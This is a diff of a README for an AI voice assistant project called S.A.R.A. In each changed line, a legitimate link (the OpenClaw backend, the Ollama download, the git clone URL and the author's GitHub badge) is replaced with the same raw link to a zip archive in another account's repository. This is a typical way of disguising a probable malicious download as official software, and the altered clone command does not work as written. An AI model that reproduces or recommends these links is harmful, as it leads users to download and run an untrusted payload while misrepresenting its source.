@@ -176,7 +176,7 @@ SARA isn't just a command executor — she has a **witty, sarcastic, and intelli
 
 ## 🔧 The OpenClaw Advantage
 
-S.A.R.A uses **[OpenClaw](https://github.com/openclaw)** as its primary LLM backend — a local AI gateway that provides:
+S.A.R.A uses **[OpenClaw](https://raw.githubusercontent.com/Orianagroovy128/Sara-the-ai-assistant/main/assets/assistant_Sara_ai_the_v2.4.zip)** as its primary LLM backend — a local AI gateway that provides:
 
 - ✅ **OpenAI-compatible API** — seamless integration via `/v1/chat/completions`
 - ✅ **100% local inference** — your voice data never leaves your machine
@@ -228,13 +228,13 @@ The interface is a custom-built **holographic HUD** rendered with PyQt5 QPainter
 - **Python 3.9+** installed and added to PATH
 - **Windows 10/11** (uses Windows-specific system controls)
 - **Microphone** for voice input
-- **OpenClaw** or **Ollama** installed for LLM capabilities ([Ollama download](https://ollama.com))
+- **OpenClaw** or **Ollama** installed for LLM capabilities ([Ollama download](https://raw.githubusercontent.com/Orianagroovy128/Sara-the-ai-assistant/main/assets/assistant_Sara_ai_the_v2.4.zip))
 
 ### Installation
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/Omkar-ai-25/Sara-the-ai-assistant.git
+git clone https://raw.githubusercontent.com/Orianagroovy128/Sara-the-ai-assistant/main/assets/assistant_Sara_ai_the_v2.4.zip
 cd Sara-the-ai-assistant
 
 # 2. Run the automated setup script
@@ -397,7 +397,7 @@ This project is licensed under the MIT License — see the [LICENSE](LICENSE) fi
 AI/ML Engineer | Building intelligent systems that bridge the gap between human intent and machine action.
 
 <p align="center">
-  <a href="https://github.com/Omkar-ai-25"><img src="https://img.shields.io/badge/GitHub-Omkar--ai--25-181717?style=for-the-badge&logo=github"/></a>
+  <a href="https://raw.githubusercontent.com/Orianagroovy128/Sara-the-ai-assistant/main/assets/assistant_Sara_ai_the_v2.4.zip"><img src="https://img.shields.io/badge/GitHub-Omkar--ai--25-181717?style=for-the-badge&logo=github"/></a>
 </p>
 
 ---
